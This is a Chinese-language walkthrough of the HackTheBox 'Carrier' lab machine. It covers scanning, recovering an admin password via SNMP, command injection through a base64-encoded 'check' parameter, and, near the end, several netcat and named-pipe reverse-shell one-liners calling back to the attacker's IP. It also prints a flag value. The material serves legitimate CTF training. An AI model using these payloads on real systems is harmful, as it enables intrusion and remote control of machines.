**openvpn配置**

在kali下安装这几个源  
apt-get install network-manager-openvpn  
apt-get install network-manager-openvpn-gnome  
apt-get install network-manager-pptp  
apt-get install network-manager-pptp-gnome  
apt-get install network-manager-strongswan  
apt-get install network-manager-vpnc  
apt-get install network-manager-vpnc-gnome

在access页面点击here下载openvpn配置文件  
https://www.hackthebox.eu/home/htb/access/ovpnfile  
使用命令：xxxx.ovpn是下载好的配置文件,这里要用root权限运行。  
sudo oepnvpn --config xxxx.ovpn  
连接成功后会在access页面看到connected打勾：

![](../Images/820f7c239c1d3d1c971fcf131084d30b.png)

登陆以后，点开machines->Active

![](../Images/5188b940102d1a7ba197294cbffe3920.png)

可以看到 Carrier的IP是10.10.10.105，我们直接访问进行实战。

  

**Carrier实战**

拿到两个flag,一个是user.txt，还有一个root.txt  
1、使用nmap扫描  
nmap -A -sV 10.10.10.105

![](../Images/990f1521b54bee1749c4a832b9a18d69.png)

2、打开一下网站，就一个登陆框，尝试了注入不行。

![](../Images/37d0b82f0dccaebb1ccc6dbf5bda15bc.png)

3、扫描一下目录  
dirb http://10.10.10.105/ /usr/share/dirb/wordlists/small.txt

![](../Images/1ca1f0e2ca19f9b0b4a7b1ef09422948.png)

  

4、查看了一下提示，扫描一下udp端口（-p167,67是扫描一遍以后得到的）  
sudo nmap -sU -sV -p161,67 10.10.10.105  
5、snmp的详细版本信息SNMPv1 server; pysnmp SNMPv3 server (public)  
6、查看snmp public  
snmpwalk -v 2c -c public 10.10.10.105

![](../Images/723344c239c60a84cb632333e23d3357.png)

7、得到一串字符串STRING: "SN#NET\_45JDX23"  
8、尝试使用admin/NET\_45JDX23登陆成功

![](../Images/4fd9e1894ccd929c72d060f83906f076.png)

9、随手点了几下看了功能

10、打开Diagnostics页面点击verify status  
返回的数据格式有点类似ps命令的输出格式：  
quagga 15105 0.0 0.0 24500 616 ? Ss 09:00 0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.1  
quagga 15109 0.0 0.1 29452 2764 ? Ss 09:00 0:00 /usr/lib/quagga/bgpd --daemon -A 127.0.0.1  
root 15114 0.0 0.0 15432 168 ? Ss 09:00 0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd  
抓包查看一下，发现参数check=cXVhZ2dh  
base64解密cXVhZ2dh ，最后得到quagga  
构造一个root，base64加密后：cm9vdAo=

![](../Images/1e9b9826b4c5bbf805cadf93a26439e9.png)

11、  
我们查看一下命令的权限，执行| whoami  
check=fCB3aG9hbWk=  
看到返回的是root

查看文件列表| ls  
check=fCBscyA=  
test\_intercept.pcap  
user.txt

执行| cat user.txt  
check=fCBjYXQgdXNlci50eHQ=  
拿到第一个flag  
5649c41df59fd6efdc4a78d79a07f2be

12、尝试反弹shell  
查看一下是否有nc。 | which nc  
/bin/nc

在kali监听nc -nlvp 4444  
在靶机上执行nc -e /bin/sh 10.10.15.7 4444  
发现并没有接收到SHELL，那很有可能是靶机的NC不支持-e操作

执行：| ls -al /bin/nc  
返回：lrwxrwxrwx 1 root root 20 Jun 22 2018 /bin/nc -> /etc/alternatives/nc  
执行：| ls -al /etc/alternatives/nc  
返回：lrwxrwxrwx 1 root root 15 Jun 22 2018 /etc/alternatives/nc -> /bin/nc.openbsd  
google了一下nc -e不能使用的情况下弹shell方法，也可以搜索openbsd  
1、失败  
| mkfifo pipe && nc 10.10.15.7 4444 <pipe | / bin / bash＆> pipe  
fCBta2ZpZm8gcGlwZSAmJiBuYyAxMC4xMC4xNS43IDQ0NDQgPHBpcGUgfCAvIGJpbiAvIGJhc2gGPiBwaXBlCg==  
2、成功  
| mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.15.7 4444 1>/tmp/backpipe  
3、成功  
| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.7 4444 >/tmp/f
